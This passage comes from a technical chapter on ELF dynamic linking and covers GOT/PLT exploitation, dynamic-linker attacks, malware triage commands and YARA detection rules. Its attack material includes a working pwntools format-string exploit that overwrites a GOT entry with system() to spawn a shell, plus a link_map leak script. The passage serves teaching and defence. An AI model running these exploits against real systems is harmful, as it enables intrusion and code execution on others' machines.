`STV_PROTECTED` symbols are exempt from interposition: when the defining object references its own `STV_PROTECTED` symbol, the dynamic linker is required to bind to the local definition, regardless of any earlier-scope definition. This is sometimes used inside libc to ensure intra-libc calls are not redirected by preloads.

`DF_SYMBOLIC` and `-Bsymbolic` cause the object's own definitions to be preferred over earlier-scope ones, with similar effect to making everything `STV_PROTECTED`. It changes the semantics of preload-based interposition for that DSO.

### 11.4 Why lazy binding exists, and why it's increasingly disabled

Lazy binding amortizes startup cost: a typical libc has thousands of exported symbols, most of which the program never calls. Resolving them at load time is wasted work. Lazy binding pushes the resolution to the first call and skips it for symbols never invoked.

Three forces have eroded its dominance:

**Determinism.** A program with lazy binding has a different memory image after first call than before. Tools that snapshot or fingerprint memory must account for this, and slow paths happen at unpredictable times.

**Security.** Writable `.got.plt` slots are a classic exploit target. The classic "GOT overwrite" primitive — control the byte sequence written to a libc-resolved function's GOT slot, redirect to attacker-controlled code, wait for the application to call the function — is closed by full RELRO, which requires eager binding (you can't lazily bind through a read-only GOT). Hardening guidance now nearly universally recommends `-Wl,-z,relro,-z,now` (full RELRO + BIND_NOW), which:

1. Causes the linker to set `DF_BIND_NOW` in `DT_FLAGS` and `DF_1_NOW` in `DT_FLAGS_1`.
2. Causes the dynamic linker to resolve all `.rela.plt` entries at load time, just like `.rela.dyn`.
3. Allows the loader to include `.got.plt` in the RELRO region, so it is `mprotect`ed read-only after relocation.

The cost is extra startup time and a slightly larger working set during load. The benefit is that the GOT/PLT mechanism stops being a corruption target.

**Profile-guided optimization** can reorder code and resolve hot symbols up front anyway, so the lazy-binding savings are smaller than they used to be.

A binary's binding policy can be inspected with `readelf -d binary | grep -E '(BIND_NOW|FLAGS)'`; the presence of `BIND_NOW` in `FLAGS_1` or `DT_BIND_NOW` indicates eager binding.

### 11.5 Detection and forensics opportunities at the GOT/PLT layer

The lazy-binding mechanism makes the GOT/PLT a focus of both offensive techniques and defensive instrumentation:

GOT hooking: an attacker with a write primitive into a target process's `.got.plt` (when not full-RELRO) can redirect calls. Detection: comparing GOT entries against expected resolved addresses (computed by walking the symbol-resolution rules) is inexpensive and finds tampering. The `link_map` chain is enumerable from `r_debug`, which is reachable from `DT_DEBUG`.

PLT auditing: `LD_AUDIT`'s `la_pltenter`/`la_pltexit` callbacks observe each call through the PLT. Useful for tracing in controlled environments; not a defense (an attacker who can run code can avoid the PLT).

Resolver hijacking: replacing `_dl_runtime_resolve`'s GOT slot (`.got.plt[2]`) redirects every lazy resolution. Detection: again, compare against expected.

Static binaries skip all of this. A defender's posture against a self-contained static implant cannot rely on dynamic-linker visibility; the relevant interception must move to seccomp-bpf, kernel auditing, or similar lower layers.

---

## 12. Putting the load sequence together

A coherent timeline for a typical PIE binary on Linux x86_64:

`execve` → kernel parses ELF header, walks `PT_LOAD`, picks ASLR base, mmaps segments, mmaps `PT_INTERP` interpreter at separate base, builds stack with auxv, transfers control to interpreter `_start`.

Interpreter `_start` → `_dl_start` → self-relocates via `R_X86_64_RELATIVE`, finds program's program headers via `AT_PHDR`, locates program's `PT_DYNAMIC`.

`_dl_start` → `_dl_main` → walks `DT_NEEDED`, opens dependencies, mmaps each DSO, builds the global scope.

For each DSO: resolves `R_X86_64_RELATIVE` and `R_X86_64_GLOB_DAT` in `.rela.dyn` (eager), resolves `R_X86_64_JUMP_SLOT` in `.rela.plt` only if `DT_BIND_NOW` else defers, runs `IRELATIVE` resolvers, applies `COPY` relocations.

`_dl_protect_relro` → `mprotect`s `PT_GNU_RELRO` ranges to read-only.

Constructor phase: pre-init array (program only), then init/init_array per DSO in dependency order.

Transfer to program's `e_entry` → `_start` → `__libc_start_main` → `main`.

At every program call to an imported function, if lazy binding is in effect: PLT stub → `_dl_runtime_resolve` → `_dl_fixup` → GOT slot updated → resolved function called. From the second call onward: PLT stub → resolved function directly.

At program exit: atexit handlers (in reverse registration order), then per-DSO fini_array in reverse dependency order, then per-DSO `DT_FINI`, then kernel `_exit`.

This is the spine. Subsequent chapters build out branches on it: TLS allocation between mmap and constructors, IFUNC resolution between relocation and RELRO, `.eh_frame` registration with the unwinder during constructors, symbol versioning's role in resolution, and the security-relevant segments (RELRO, GNU_STACK, GNU_PROPERTY) and their hardware backings.

---

## 13. GOT/PLT exploitation techniques

Section 11 described the mechanics of the GOT and PLT as they exist for the loader. This section describes how those same mechanics become an attack surface. The GOT overwrite is one of the oldest classes of control-flow hijack in ELF exploitation, and variations on it remain relevant wherever full RELRO is absent.

### 13.1 GOT overwrite attack

The mechanism is straightforward: if an attacker obtains an arbitrary-write primitive (a heap overflow, a format-string vulnerability, an out-of-bounds array write), they can overwrite a GOT entry for a function the program will call later. When the program subsequently calls that function through its PLT stub, the indirect jump reads the corrupted GOT slot and transfers control to the attacker's chosen address.

Prerequisites are a write primitive of at least 8 bytes at a controlled offset, knowledge of the target GOT entry's address (which requires defeating ASLR — usually via a prior information leak), and knowledge of the address to write (typically `system()` or a one-gadget in libc, again requiring a leaked libc base). The attack fails against binaries compiled with full RELRO because the GOT is `mprotect`'d read-only after relocation; the write primitive triggers a segmentation fault instead of a hijack.

A complete demonstration using pwntools, targeting a binary with partial RELRO and a format-string vulnerability that provides both the leak and the write:

```python
from pwn import *

# Configuration
binary_path = "./vuln"
elf = ELF(binary_path)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf

def exploit():
    p = process(binary_path)

    # Stage 1: leak a libc address via GOT.
    # The format string reads the GOT entry for puts, which already
    # contains the resolved libc address of puts (after first call).
    got_puts = elf.got['puts']
    payload_leak = f"%7$s".encode().ljust(8, b'\x00') + p64(got_puts)
    p.sendline(payload_leak)
    leaked = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f"leaked puts@libc: {hex(leaked)}")

    # Stage 2: compute libc base and target.
    libc.address = leaked - libc.symbols['puts']
    system_addr = libc.symbols['system']
    log.info(f"libc base: {hex(libc.address)}")
    log.info(f"system@libc: {hex(system_addr)}")

    # Stage 3: overwrite GOT entry for puts with system().
    # Next time the program calls puts(user_input), it calls system(user_input).
    write_payload = fmtstr_payload(
        offset=6,
        writes={elf.got['puts']: system_addr},
        numbwritten=0,
        write_size='short'   # write two bytes at a time to stay within output limits
    )
    p.sendline(write_payload)

    # Stage 4: trigger the hijacked call.
    p.sendline(b"/bin/sh")
    p.interactive()

exploit()
```

The artifacts left by this attack include a GOT entry that no longer matches the symbol it was resolved to (detectable by comparing `.got.plt` contents against the expected symbol addresses from the `link_map` chain), and — if the exploit used a format string — anomalous output or log entries containing the format-string payload's byte patterns. CVE-2015-8543 (AF_ALG use-after-free providing a kernel write primitive) and CVE-2023-6246 (glibc `__vsyslog_internal` heap overflow) are examples of vulnerabilities whose exploitation chains commonly terminate in a GOT overwrite.

### 13.2 Partial RELRO vs full RELRO impact

Under **partial RELRO** (the default for many older toolchains: `-Wl,-z,relro` without `-z,now`), the linker places `.dynamic`, `.got`, and several metadata sections into the RELRO region, but `.got.plt` remains writable because lazy binding needs to update it at runtime. This is the configuration that permits GOT overwrites. The `.got` (holding `GLOB_DAT` entries for global variables) is protected, but the `.got.plt` (holding `JUMP_SLOT` entries for function pointers) is not.

Under **full RELRO** (`-Wl,-z,relro,-z,now`), the linker sets `DF_BIND_NOW`, the dynamic linker resolves all PLT relocations eagerly at load time, and `.got.plt` is included in the RELRO `mprotect` region. After relocation, the entire GOT is read-only. An attacker's write primitive targeting a GOT slot hits read-only memory and produces `SIGSEGV`. This is why full RELRO is the single most impactful ELF hardening flag for closing GOT-based attacks.

The distinction matters for detection engineering: a binary with partial RELRO and network-facing input handling is a higher-priority audit target than one with full RELRO. Inspecting the RELRO posture is cheap — `readelf -d binary | grep -E 'BIND_NOW|FLAGS'` or `checksec --file=binary` — and should be part of any binary intake pipeline.

### 13.3 PLT hijacking via `.plt.got` and `.plt.sec`

Modern binaries compiled with `-fcf-protection` (CET) or newer binutils produce two additional PLT-like sections. `.plt.got` contains PLT stubs for functions resolved eagerly (typically `GLOB_DAT`-bound, not `JUMP_SLOT`-bound); these stubs are shorter because no lazy-binding fallback is needed. `.plt.sec` is the CET-aware PLT: each stub begins with `endbr64` (the indirect-branch-tracking landing pad), and the indirect jump uses the secondary GOT.

An attacker targeting `.plt.got` entries faces the same constraint as a standard GOT overwrite: the GOT slot must be writable. However, `.plt.got` entries are sometimes overlooked by defenses that only audit `.got.plt`. A comprehensive GOT integrity check must enumerate all relocation-target addresses from `.rela.dyn` and `.rela.plt`, not just the `.got.plt` section.

For `.plt.sec`, the CET `endbr64` requirement means that redirected control flow must land on a valid `endbr64` instruction or the CPU raises `#CP`. This narrows the gadget space considerably but does not eliminate it — every function entry and every `endbr64`-tagged indirect-branch target remains usable.

### 13.4 Ret2PLT

Ret2PLT is a technique for calling arbitrary imported functions without knowing their runtime addresses. If the attacker controls the stack (via a buffer overflow) and the binary imports the desired function (e.g., `system()` or `execve()`), they can return into the PLT stub for that function. The PLT stub will resolve the symbol through normal lazy binding or read the already-resolved GOT entry — the attacker never needs a libc leak.

The classic ret2PLT chain on x86_64: overwrite a saved return address with the address of the PLT entry for the target function, place the argument in `rdi` (using a `pop rdi; ret` gadget found in the binary), and place a pointer to the argument string (e.g., `"/bin/sh"` found in the binary's `.rodata` or in libc if already leaked) in the stack position that the gadget will pop. Because PIE randomizes the binary's base, ret2PLT against a PIE binary also requires a base-address leak — but against a non-PIE `ET_EXEC`, the PLT addresses are fixed and the attack works without any leak.

### 13.5 `.fini_array` overwrite for persistence

The `.fini_array` section contains an array of function pointers that the dynamic linker calls during process teardown — after `main()` returns and atexit handlers have run, but before the process truly exits. Chapter 1B covers the constructor/destructor execution ordering in detail. From an exploitation perspective, overwriting a `.fini_array` entry gives the attacker code execution that fires at exit time, which is useful for two purposes: re-executing the exploit loop (by overwriting the entry with the address of `main` or of a controlled function, causing the program to restart rather than exit) and for delayed payload execution in scenarios where the exploit's initial write primitive fires too early for the attacker's payload to be fully staged.

Under partial RELRO, `.fini_array` sits in a writable data segment and is overwritable. Under full RELRO, `.fini_array` is typically inside the RELRO region and therefore read-only after relocation. Detection: monitoring `.fini_array` entries against their expected values (which are fixed at link time and visible in `.rela.dyn` as `R_X86_64_RELATIVE` relocations) reveals tampering.

### 13.6 `.init_array` abuse for early code execution

Symmetrically, `.init_array` contains function pointers executed during the constructor phase — before `main()`. An attacker who can modify a binary on disk (a supply-chain scenario) or patch it in memory before constructors run can inject an entry into `.init_array` to achieve code execution at the earliest possible userspace moment, before most security frameworks have initialized. Malware that modifies ELF binaries on disk often appends to `.init_array` rather than patching `e_entry`, because `.init_array` modifications are less disruptive to the binary's overall structure and less likely to trigger signature-based detection.

Detection: compare `.init_array` entries against the binary's symbol table to verify that every pointer resolves to a known function within the binary's own text segment. Entries pointing outside `.text`, into a different segment, or into injected code caves are anomalous. YARA rules for this are provided in §16.

### 13.7 DT_DEBUG pointer walking to leak link_map and libc base

The `DT_DEBUG` entry in `.dynamic` (§7) points to the `r_debug` structure maintained by the dynamic linker. This structure contains a pointer to the head of the `link_map` linked list — one node per loaded object (executable, each DSO, vDSO, ld.so itself). Each `link_map` node carries the object's load base address (`l_addr`) and its name (`l_name`). Walking this list from within a debugger, an exploit script, or an instrumentation tool reveals the base address of every loaded library, including libc.

```python
from pwn import *

def leak_libc_via_dt_debug(p, elf):
    """
    Given a process handle and an ELF object for the main binary,
    walk DT_DEBUG -> r_debug -> link_map to find libc's base.
    Requires: ability to read arbitrary memory (e.g., via format string %s).
    """
    # Step 1: locate .dynamic in the binary.  DT_DEBUG is written by ld.so
    # at load time, so we must read it from the live process, not the file.
    dynamic_addr = elf.get_section_by_name('.dynamic').header.sh_addr
    if elf.pie:
        dynamic_addr += elf_base  # add leaked PIE base

    # Step 2: scan .dynamic for DT_DEBUG (tag value 21).
    # Each Elf64_Dyn is 16 bytes: 8-byte d_tag + 8-byte d_val/d_ptr.
    dt_debug_ptr = None
    for i in range(0, 0x200, 16):
        tag = u64(leak(p, dynamic_addr + i, 8))
        if tag == 21:  # DT_DEBUG
            dt_debug_ptr = u64(leak(p, dynamic_addr + i + 8, 8))
            break
        if tag == 0:   # DT_NULL — end of .dynamic
            break

    # Step 3: r_debug layout (from <link.h>):
    #   int r_version;          // offset 0, 4 bytes
    #   struct link_map *r_map; // offset 8 (aligned), 8 bytes
    r_map = u64(leak(p, dt_debug_ptr + 8, 8))

    # Step 4: walk link_map.  Each node:
    #   Elf64_Addr l_addr;           // offset 0 — load base
    #   char      *l_name;           // offset 8 — path string pointer
    #   Elf64_Dyn *l_ld;             // offset 16
    #   struct link_map *l_next;     // offset 24
    node = r_map
    while node:
        l_addr = u64(leak(p, node, 8))
        l_name_ptr = u64(leak(p, node + 8, 8))
        name = leak_string(p, l_name_ptr)
        log.info(f"  {name}: base = {hex(l_addr)}")
        if b"libc" in name:
            return l_addr
        l_next = u64(leak(p, node + 24, 8))
        node = l_next if l_next else None

    return None
```

This technique is used both offensively (to compute libc gadget addresses during exploitation) and defensively (to audit the set of loaded objects from userspace without relying on `dlopen` or `/proc/PID/maps`). Forensic tools that reconstruct the loaded-object list from a core dump or memory image use the same `r_debug` → `link_map` walk.

---

## 14. Dynamic linker exploitation

The dynamic linker is the most privileged userspace component in an ELF process's early life: it runs before any application code, it has write access to every segment it maps, and it is reachable through several environment-variable-based control channels. This section covers attacks against and through `ld.so`.

### 14.1 LD_PRELOAD injection

`LD_PRELOAD` names one or more shared objects that the dynamic linker loads before any `DT_NEEDED` dependency. Because symbol lookup walks the global scope in order (§11.3), functions defined in the preloaded object shadow identically-named functions in later-loaded objects — including libc. This is the mechanism behind legitimate interposition tools (`libfaketime`, `libnss_*`, `jemalloc` replacing `malloc`), but it is equally effective for malicious hooking.

The mechanism: the attacker places a shared object containing, e.g., a `read()` implementation that logs or modifies data before calling the real `read()` (obtained via `dlsym(RTLD_NEXT, "read")`) into a world-readable path, then sets `LD_PRELOAD=/path/to/evil.so` in the environment of the target process. On the next `execve`, the dynamic linker loads `evil.so` first, and every call to `read()` in the program and all its libraries goes through the attacker's version.

Defence layer 1: `AT_SECURE`. For setuid, setgid, and file-capability-bearing binaries, the kernel sets `AT_SECURE=1` in the auxiliary vector, and the dynamic linker ignores `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, and other dangerous environment variables. This is the critical protection for privilege-escalation scenarios. CVE-2010-3856 (glibc `LD_AUDIT` bypass via `$ORIGIN` expansion in `DT_RPATH`) demonstrated that bugs in the `AT_SECURE` enforcement path are high-severity.

Defence layer 2: detection via `/proc/PID/maps` and `/proc/PID/environ`. A library that should not be loaded appearing in the maps of a running process, or an `LD_PRELOAD` entry in a process's environment that was not set by the expected service manager, are strong indicators. Auditd rules for this are provided in §19.

```bash
# auditd rule: alert on any process setting LD_PRELOAD in its environment
# (catches direct execution; does not catch inherited environment)
-w /etc/ld.so.preload -p wa -k ld_preload_file
-a always,exit -F arch=b64 -S execve -F key=exec_monitor
# Post-processing: grep for LD_PRELOAD in /proc/PID/environ of flagged PIDs.
```

Defence layer 3: compile with `-Wl,-z,now -Wl,-z,relro` and use `STV_PROTECTED` visibility or `-Bsymbolic` on critical internal symbols to prevent preload interposition on intra-library calls.

### 14.2 LD_LIBRARY_PATH manipulation

`LD_LIBRARY_PATH` prepends directories to the dynamic linker's search path (after `DT_RPATH` but before `/etc/ld.so.cache`). An attacker who controls this variable can supply a malicious `libc.so.6` or any other dependency, which the dynamic linker will load in preference to the system copy. The defenses are the same as for `LD_PRELOAD`: `AT_SECURE` suppression for privileged binaries, and environment monitoring for unprivileged ones.

A subtlety: `LD_LIBRARY_PATH` is inherited across `execve` calls unless explicitly cleared. A compromised parent process that launches children with a poisoned `LD_LIBRARY_PATH` can hijack every dynamically-linked child without per-child `LD_PRELOAD` entries. Service managers should sanitize the environment before launching daemons — systemd's `EnvironmentFile=` and `Environment=` directives, combined with `NoNewPrivileges=true`, mitigate this.

### 14.3 DT_RPATH and DT_RUNPATH abuse

`DT_RPATH` and `DT_RUNPATH` are embedded in the binary's `.dynamic` section and specify directories the dynamic linker searches for dependencies. The search order is: `DT_RPATH` (if `DT_RUNPATH` is absent), then `LD_LIBRARY_PATH` (unless `AT_SECURE`), then `DT_RUNPATH`, then `/etc/ld.so.cache`, then default paths.

`DT_RPATH` is legacy and is searched before `LD_LIBRARY_PATH`, making it more powerful but also more dangerous. If a binary contains `DT_RPATH` pointing to a world-writable directory, any user on the system can place a malicious library there and it will be loaded preferentially. The `$ORIGIN` token (expanded to the directory containing the binary) is especially dangerous if the binary is in a user-writable directory or if symlink attacks can redirect `$ORIGIN`.

Detection: `readelf -d binary | grep -E 'RPATH|RUNPATH'` shows embedded search paths. YARA or static-analysis rules should flag binaries with `DT_RPATH` containing world-writable directories, `$ORIGIN` in setuid binaries, or absolute paths to temporary directories. CVE-2010-3847 (glibc `$ORIGIN` expansion privilege escalation) is the canonical example.

### 14.4 LD_AUDIT interface abuse

`LD_AUDIT` names an auditor shared object loaded by the dynamic linker. The auditor defines callback functions (`la_objsearch`, `la_activity`, `la_symbind64`, `la_pltenter`, `la_pltexit`) that the linker invokes during its operation. `la_symbind64` is called for every symbol binding and receives the symbol's address — an attacker's auditor can modify the returned address to redirect any symbol. `la_pltenter` intercepts every PLT call.

Chapter 1B covers the audit interface's legitimate instrumentation uses. From an offensive perspective, `LD_AUDIT` is more powerful than `LD_PRELOAD` because it operates at the symbol-binding level rather than the symbol-definition level: an auditor can redirect individual symbols selectively, without defining replacement functions. It is subject to the same `AT_SECURE` restriction.

### 14.5 dl_iterate_phdr for runtime ELF introspection

`dl_iterate_phdr` is a glibc function that calls a user-supplied callback once per loaded shared object, passing the object's program header table, load base, and name. It is the canonical way to enumerate loaded objects from within a running process.

```c
#define _GNU_SOURCE
#include <link.h>
#include <stdio.h>

static int callback(struct dl_phdr_info *info, size_t size, void *data) {
    printf("%-40s base=0x%lx  phnum=%d\n",
           info->dlpi_name[0] ? info->dlpi_name : "[main]",
           (unsigned long)info->dlpi_addr,
           info->dlpi_phnum);
    for (int i = 0; i < info->dlpi_phnum; i++) {
        const Elf64_Phdr *ph = &info->dlpi_phdr[i];
        if (ph->p_type == PT_LOAD) {
            printf("  PT_LOAD  vaddr=0x%lx  memsz=0x%lx  flags=%c%c%c\n",
                   (unsigned long)(info->dlpi_addr + ph->p_vaddr),
                   (unsigned long)ph->p_memsz,
                   ph->p_flags & PF_R ? 'R' : '-',
                   ph->p_flags & PF_W ? 'W' : '-',
                   ph->p_flags & PF_X ? 'X' : '-');
        }
    }
    return 0;
}

int main(void) {
    dl_iterate_phdr(callback, NULL);
    return 0;
}
```

Security applications: a runtime integrity monitor can call `dl_iterate_phdr` periodically and compare the set of loaded objects against a known-good baseline. An unexpected object appearing (injected via `dlopen` or `LD_PRELOAD`) is detectable this way. The function is also used by exception-handling runtimes to locate `.eh_frame` unwind tables across DSO boundaries.

### 14.6 _dl_fixup internals and lazy-binding resolver exploitation

When a lazily-bound PLT stub is called for the first time (§11.2), control reaches `_dl_runtime_resolve`, which saves registers and calls `_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)`. `_dl_fixup` performs the following:

1. Reads `.rela.plt[reloc_arg]` to obtain `r_info` (symbol index and type) and `r_offset` (GOT slot to patch).
2. Extracts the symbol index from `r_info`, looks up the symbol in `.dynsym`, reads its name from `.dynstr`.
3. Searches the global scope for the symbol definition (§11.3).
4. Writes the resolved address to `*r_offset` (the GOT slot).
5. Returns the resolved address so `_dl_runtime_resolve` can tail-jump to it.

An attacker who can forge the `reloc_arg` passed on the stack (the value pushed by the PLT stub) can redirect `_dl_fixup` to resolve an arbitrary symbol. The **ret2dlresolve** technique crafts a fake `Elf64_Rela` entry (and optionally a fake `Elf64_Sym` and string table entry) in a controlled memory region, and sets `reloc_arg` to point to it. The resolver dutifully looks up the attacker-chosen symbol name (e.g., `"system"`) and writes its address into the attacker-chosen GOT slot, then jumps to it with attacker-controlled arguments.

Prerequisites: control of the stack (to set `reloc_arg` and arguments), writable memory at a known address (to place the fake relocation structures), and partial RELRO (full RELRO resolves everything eagerly and `_dl_fixup` is never called at runtime). This technique bypasses ASLR without a leak because the attacker does not need to know libc's address — the dynamic linker resolves the symbol through normal lookup.

### 14.7 Symbol versioning attacks

Symbol versioning (covered in depth in Chapter 1B) attaches version tags to symbol references and definitions. A reference to `malloc@GLIBC_2.17` will only bind to a definition carrying that version tag. An attacker who supplies a malicious library with the correct versioned symbols can evade version-mismatch detection. Conversely, a binary compiled against a newer glibc version that specifies, say, `GLIBC_2.34` will fail to load on a system with an older glibc — a deployment compatibility issue that attackers can exploit for targeted denial of service by manipulating the version requirements in a binary's `.gnu.version_r` section.

---

## 15. ELF malware analysis techniques

This section provides the triage methodology for suspicious ELF binaries: the tool commands, the anomalies each reveals, and the reasoning behind the checks.

### 15.1 readelf/objdump triage commands

The first minutes with a suspicious binary should produce a structural fingerprint:

```bash
# File header: architecture, type (ET_EXEC/ET_DYN), entry point, section/program header counts
readelf -h suspicious.elf

# Program headers: segment types, permissions, offsets, sizes
readelf -l suspicious.elf

# Section headers: names, types, flags, addresses, sizes
readelf -S suspicious.elf

# Dynamic section: DT_NEEDED, DT_RPATH, DT_FLAGS, DT_DEBUG, etc.
readelf -d suspicious.elf

# Dynamic symbol table
readelf --dyn-syms suspicious.elf

# All relocations
readelf --relocs suspicious.elf

# Notes (build ID, ABI tag, properties)
readelf -n suspicious.elf

# Full headers + hex dump of a suspicious section
objdump -h suspicious.elf
objdump -s -j .init_array suspicious.elf
```

Each command produces signals. A binary with `e_shoff=0` (no section headers) but a valid program header table is stripped of analysis metadata — not inherently malicious, but unusual for legitimate distribution. A binary with `PT_LOAD` segments whose permissions are `RWX` is either packed or deliberately evasive. A binary with no `DT_NEEDED` entries is statically linked. A binary whose `e_entry` points into a segment that is not the one containing `.text` has been modified post-link.

### 15.2 Entropy analysis for packed/encrypted binaries

Packers (UPX, custom packers, crypters) compress or encrypt the binary's code and data sections, leaving only a small unpacking stub in cleartext. Compressed and encrypted data have high Shannon entropy (approaching 8.0 bits per byte for random data, typically 7.2–7.9 for compressed data), while normal compiled code averages 5.5–6.5.

```python
import math
from collections import Counter
from elftools.elf.elffile import ELFFile

def section_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum(
        (c / length) * math.log2(c / length)
        for c in counts.values()
    )

def analyze_elf_entropy(path: str):
    with open(path, 'rb') as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            if section.header.sh_size == 0:
                continue
            data = section.data()
            ent = section_entropy(data)
            flag = " *** HIGH ENTROPY" if ent > 7.0 else ""
            print(f"  {section.name:24s}  size={len(data):8d}  entropy={ent:.4f}{flag}")

analyze_elf_entropy("suspicious.elf")
```

A `.text` section with entropy above 7.0 is almost certainly packed or encrypted. A `.rodata` section with similarly high entropy may contain encrypted configuration data. Normal `.text` entropy ranges from 5.5 to 6.5; `.data` is typically lower (4.0–5.5) unless it contains compressed resources.

### 15.3 UPX detection and unpacking

UPX is the most common ELF packer. Detection signatures: the strings `UPX!` and `UPX0`/`UPX1` appear in section names, the binary contains a `PT_LOAD` segment with `RWX` permissions for the decompression target, and the file's overall entropy is high.

```bash
# Detect UPX via section names and magic strings
readelf -S suspicious.elf | grep -i upx
strings suspicious.elf | grep -i "UPX"

# Unpack with the UPX tool (works for unmodified UPX-packed binaries)
upx -d suspicious.elf -o unpacked.elf

# Verify the unpacked binary
readelf -h unpacked.elf
readelf -l unpacked.elf
```

For modified or custom-packed UPX binaries where `upx -d` fails (because the packer has zeroed the UPX magic or altered the header), manual unpacking is required. The approach is to run the binary under a debugger, set a breakpoint at the end of the decompression stub (typically where it jumps to the original entry point — visible as a far jump after a loop), then dump the fully-decompressed process image from memory:

```bash
# Attach with gdb and dump the unpacked image
gdb -q -ex "starti" -ex "catch syscall mprotect" -ex "continue" \
    -ex "info proc mappings" ./packed.elf
# Once at OEP, dump the relevant text segment:
# (gdb) dump memory unpacked_text.bin 0x400000 0x420000
```

Alternatively, `gcore` (§20) captures the entire process image non-destructively.

### 15.4 Section header manipulation detection

Malware authors manipulate section headers to confuse analysis tools. Common manipulations include: removing the section header table entirely (`e_shoff=0`, `e_shnum=0`), creating sections with misleading names (`.text` that is actually writable data), overlapping sections (two sections claiming the same file offset range with different attributes), and sections that extend beyond the file's size.

Detection heuristics:

A binary with `e_shoff=0` is missing its section header table. It will still execute (the kernel uses only program headers), but most analysis tools lose visibility into named sections. This is a strong anomaly signal for binaries in distribution (legitimate binaries almost always retain section headers; only deliberately hardened or malicious binaries strip them).

Sections whose `sh_offset + sh_size` exceeds the file size are invalid. Sections that overlap with the ELF header or program header table are invalid. Sections marked `SHF_EXECINSTR` but also `SHF_WRITE` (writable code) are anomalous in production binaries.

### 15.5 Segment padding injection (PT_NOTE to PT_LOAD infection)

A classic ELF infection technique converts a `PT_NOTE` segment into a `PT_LOAD` segment. The approach: `PT_NOTE` segments (containing build IDs, ABI tags) are not critical for execution and typically have slack space or can be enlarged. The infector changes the `p_type` from `PT_NOTE` (4) to `PT_LOAD` (1), adjusts `p_offset` and `p_vaddr` to point at the injected code (placed in file padding or appended), sets `p_flags` to `PF_R | PF_X`, and patches `e_entry` or a `.init_array` pointer to redirect execution to the injected segment.

Detection: a binary with two `PT_LOAD` segments at unusual virtual addresses (one of which corresponds to the former `PT_NOTE` range), or a binary whose `PT_NOTE` is missing when the build-ID note section is still present in section headers, has likely been infected. The YARA rule in §16 detects this pattern.

### 15.6 ELF header anomalies

Beyond `e_shoff=0`, other header anomalies include: `e_entry` pointing outside any executable segment (the binary will segfault unless the entry is adjusted at runtime), `e_phoff` at an unusual offset (normally immediately after the ELF header at offset 64 for 64-bit), `e_ehsize` not equal to 64 (for ELF64), and overlapping program headers (two `PT_LOAD` segments whose virtual address ranges intersect). Each of these is unusual in legitimate binaries and should trigger deeper analysis.

### 15.7 Process image vs disk image comparison

Fileless malware and runtime packers produce a process whose memory image differs from its on-disk binary. Comparing the two reveals runtime modifications: sections that were encrypted on disk are now cleartext in memory, GOT entries have been patched to unexpected addresses, or entirely new memory regions (`mmap`'d anonymous pages with `RWX` permissions) exist that have no corresponding file segment.

```bash
# Capture the running process's memory layout
cat /proc/$PID/maps

# Dump a specific memory region
dd if=/proc/$PID/mem bs=1 skip=$((0x555555554000)) count=$((0x2000)) \
   of=runtime_text.bin 2>/dev/null

# Compare against the on-disk .text section
objcopy -O binary -j .text ./binary disk_text.bin
diff <(xxd runtime_text.bin) <(xxd disk_text.bin)
```

Any difference in read-only executable segments between disk and memory indicates runtime patching — which is either a packer's decompression, a debugger's breakpoint insertion, or malicious code modification.

### 15.8 Core dump analysis for unpacking

`gcore` attaches to a running process and writes a core file without killing it. For packed malware, run the binary in a sandbox, let the unpacking stub complete, then capture the core:

```bash
# In one terminal: run the packed binary under strace to observe its behavior
strace -f -o /tmp/trace.log ./packed_malware &
MALWARE_PID=$!

# In another terminal: wait for decompression to complete, then capture
sleep 2  # adjust timing based on packer behavior
gcore -o /tmp/unpacked_core $MALWARE_PID

# Parse the core with readelf to find the unpacked text
readelf -l /tmp/unpacked_core.$MALWARE_PID
readelf --segments /tmp/unpacked_core.$MALWARE_PID | grep LOAD
```

The core file is an ELF core (`ET_CORE`) with `PT_LOAD` segments corresponding to the process's memory regions. The unpacked code and data are recoverable from these segments. Tools like `eu-unstrip` can reconstruct a partial ELF from the core if symbol information is available.

---

## 16. YARA rules for ELF anomalies

The following YARA rules detect structural anomalies that are common in malicious or tampered ELF binaries. Each rule targets a specific manipulation pattern described in §15.

### 16.1 ELF with no section headers

A binary with `e_shoff == 0` has no section header table. Legitimate distribution binaries almost universally retain section headers.

```
rule elf_no_section_headers {
    meta:
        description = "ELF binary with no section header table (e_shoff=0)"
        severity = "medium"
        technique = "T1027 - Obfuscated Files or Information"
    condition:
        uint32(0) == 0x464c457f and
        uint8(4) == 2 and
        uint64(40) == 0
}
```

### 16.2 PT_NOTE converted to PT_LOAD (virus infection)

This rule detects binaries where a program header that would normally be `PT_NOTE` has been changed to `PT_LOAD`, a signature of segment-padding infection (§15.5). It scans program headers for a `PT_LOAD` whose file offset and size correspond to a note-sized region.

```
rule elf_ptnote_to_ptload_infection {
    meta:
        description = "ELF with PT_NOTE possibly converted to PT_LOAD (segment infection)"
        severity = "high"
        technique = "T1055.009 - Process Injection: Proc Memory"
    condition:
        uint32(0) == 0x464c457f and
        uint8(4) == 2 and
        for any i in (0..uint16(56) - 1) : (
            // Check each program header: p_type == PT_LOAD (1)
            uint32(uint64(32) + i * 56) == 1 and
            // but the segment is suspiciously small (< 4096 bytes file size)
            // and executable — characteristic of a converted PT_NOTE
            uint64(uint64(32) + i * 56 + 32) < 4096 and
            uint32(uint64(32) + i * 56 + 4) & 1 == 1 and
            // and the binary has no actual PT_NOTE segment remaining
            not for any j in (0..uint16(56) - 1) : (
                uint32(uint64(32) + j * 56) == 4
            )
        )
}
```

### 16.3 UPX-packed ELF

```
rule elf_upx_packed {
    meta:
        description = "ELF binary packed with UPX"
        severity = "low"
        packer = "UPX"
    strings:
        $upx_magic = "UPX!"
        $upx_section0 = "UPX0"
        $upx_section1 = "UPX1"
    condition:
        uint32(0) == 0x464c457f and
        ($upx_magic or ($upx_section0 and $upx_section1))
}
```

### 16.4 Suspicious .init_array / .fini_array entries

This rule detects ELF binaries where `.init_array` or `.fini_array` section names are present and the binary also contains strings associated with known malware init-hooking patterns (calls to `system()`, `execve()`, or shellcode-like byte sequences near array entries).

```
rule elf_suspicious_init_fini_array {
    meta:
        description = "ELF with suspicious .init_array/.fini_array content"
        severity = "high"
        technique = "T1546.004 - Event Triggered Execution: Unix Shell Configuration"
    strings:
